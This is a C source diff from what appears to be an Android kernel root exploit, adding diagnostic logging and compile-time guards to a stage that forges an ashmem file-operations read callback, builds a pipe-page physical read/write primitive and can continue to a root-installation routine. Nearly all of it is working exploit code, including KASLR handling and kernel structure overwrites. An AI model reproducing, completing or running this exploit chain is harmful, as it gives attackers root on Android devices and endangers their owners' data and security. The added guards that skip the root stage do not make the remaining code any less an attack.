+  pr_warning("PI-probe-only guard: refusing CFI/root stages\n");
+  return 0;
+#endif
   cfi_attempts++;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("cfi-stage-start", cfi_attempts, getpid());
+#endif
   int fd = open_ashmem_device();
 
   if (fd < 0) {
     cfi_last_step = 11;
     cfi_last_errno = errno;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("cfi-stage-open-failed", cfi_last_step,
+                        cfi_last_errno);
+#endif
     return 0;
   }
 
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   ssize_t n =
     configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
+  int write_errno = errno;
   cfi_write_ret = n;
-  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
+  pr_info("cfi write ret=%zd errno=%d\n", n, write_errno);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("cfi-stage-write", (unsigned long long)n,
+                      write_errno);
+#endif
   if (n != (ssize_t)sizeof(payload)) {
     cfi_last_step = 1;
-    cfi_last_errno = errno;
+    cfi_last_errno = write_errno;
     goto fail;
   }
   cfi_dirty_seen = 1;
@@ -1464,12 +3357,17 @@ int try_cfi_stage(void) {
   memset(readback, 0, sizeof(readback));
   ssize_t r =
     configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
+  int read_errno = errno;
   cfi_read_ret = r;
-  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
+  pr_info("cfi read ret=%zd errno=%d\n", r, read_errno);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("cfi-stage-read", (unsigned long long)r,
+                      read_errno);
+#endif
   if (r != (ssize_t)sizeof(readback) ||
       memcmp(readback, payload, sizeof(payload)) != 0) {
     cfi_last_step = 3;
-    cfi_last_errno = errno;
+    cfi_last_errno = read_errno;
     goto fail;
   }
 
@@ -1478,6 +3376,103 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     goto fail;
   }
+
+#if defined(RMG_DIAG_PIPE_AFTER_CFI) && RMG_DIAG_PIPE_AFTER_CFI
+  /* Run the pipe-page oracle only after the normal route has validated the
+   * forged ashmem read callback. The main-route thread owns this preparation
+   * point; stop here before physical read/write or root installation. */
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-after-cfi-start", cfi_read_ret, 0);
+#endif
+  atomic_store(&pipe_prepare_done, 0);
+  atomic_store(&pipe_prepare_request, 1);
+  int pipe_waited = 0;
+  /* This preparation can itself need more than two minutes on this device;
+   * allow up to ten minutes while the enclosing RMG run has a 15-minute cap. */
+  for (; pipe_waited < 60000; pipe_waited++) {
+    if (atomic_load(&pipe_prepare_done))
+      break;
+    usleep(10000);
+  }
+  if (pipe_waited == 60000) {
+    cfi_last_step = 36;
+    cfi_last_errno = ETIMEDOUT;
+    pr_error("route-timed pipe diagnostic timed out\n");
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("pipe-after-cfi-timeout", pipe_waited, 0);
+#endif
+    goto fail;
+  }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("cfi-stage-pipe-return", pipebuf_page_base,
+                      pipe_waited);
+#endif
+#if RMG_DIAG_PIPE_PHYSRW_ONLY
+  /* Return through fail cleanup before install_android_root() can run. */
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-physrw-only-start", pipebuf_page_base,
+                      pipebuf_pipe_idx);
+#endif
+#if RMG_DIAG_PIPE_RECLAIM_TRACE
+#if RMG_DIAG_PIPE_PHYSRW_PROOF_AFTER_CORRELATION
+  int physrw_only_ok = run_pipe_reclaim_physrw_diagnostic(fd);
+  pr_warning("pipe reclaim physrw diagnostic complete ok=%d idx=%d; "
+             "root installation skipped\n",
+             physrw_only_ok, pipebuf_pipe_idx);
+#else
+  int physrw_only_ok = run_pipe_reclaim_diagnostic(fd);
+  pr_warning("pipe reclaim trace diagnostic complete found=%d idx=%d; "
+             "physical read/write and root installation skipped\n",
+             physrw_only_ok, pipebuf_pipe_idx);
+#endif
+#else
+  int physrw_only_ok = install_pipe_physrw(fd);
+  pr_warning("pipe physrw-only diagnostic complete ok=%d idx=%d; "
+             "root installation skipped\n",
+             physrw_only_ok, pipebuf_pipe_idx);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-physrw-only-done", physrw_only_ok,
+                      pipebuf_pipe_idx);
+#endif
+  cfi_last_step = 38;
+  cfi_last_errno = physrw_only_ok ? 0 : errno;
+  goto fail;
+#elif RMG_DIAG_PIPE_AFTER_CFI_CONTINUE
+  /* Preserve the validated route-timed pipe preparation, then continue into
+   * install_pipe_physrw(). That function must pass cache identity, unique
+   * marker correlation, and scratch read/write proof before root installation
+   * is reachable. */
+  if (!pipebuf_page_base) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("pipe-after-cfi-null-base", pipebuf_page_base,
+                        pipebuf_pipe_idx);
+#endif
+    cfi_last_step = 39;
+    cfi_last_errno = ENODATA;
+    pr_error("route-timed pipe preparation returned no candidate page; "
+             "aborting before the root path\n");
+    goto fail;
+  }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-after-cfi-continue", pipebuf_page_base,
+                      pipebuf_pipe_idx);
+#endif
+  pr_info("route-timed pipe preparation complete base=%016zx; continuing "
+          "through gated physrw and root path\n", pipebuf_page_base);
+#else
+  cfi_last_step = 37;
+  cfi_last_errno = 0;
+  pr_warning("route-timed pipe diagnostic complete base=%016zx; "
+             "physical read/write and root stages skipped\n",
+             pipebuf_page_base);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-after-cfi-done", pipebuf_page_base,
+                      pipebuf_pipe_idx);
+#endif
+  goto fail;
+#endif
+#endif
 
   pr_info("cfi starting pipe physrw\n");
 
@@ -1538,13 +3533,23 @@ int try_cfi_stage(void) {
     cfi_last_step = 0;
     cfi_last_errno = 0;
     atomic_store(&cfi_stage_done, 1);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("cfi-stage-success", cfi_attempts, owner);
+#endif
     return 1;
   }
   cfi_last_step = 7;
   cfi_last_errno = errno;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("cfi-stage-owner-failed", cfi_last_step,
+                      cfi_last_errno);
+#endif
   return 0;
 
 fail:
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("cfi-stage-fail", cfi_last_step, cfi_last_errno);
+#endif
   {
     uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
     if (kaslr_done) {
@@ -1570,4 +3575,5 @@ fail:
   }
   SYSCHK(close(fd));
   return 0;
+#endif
 }
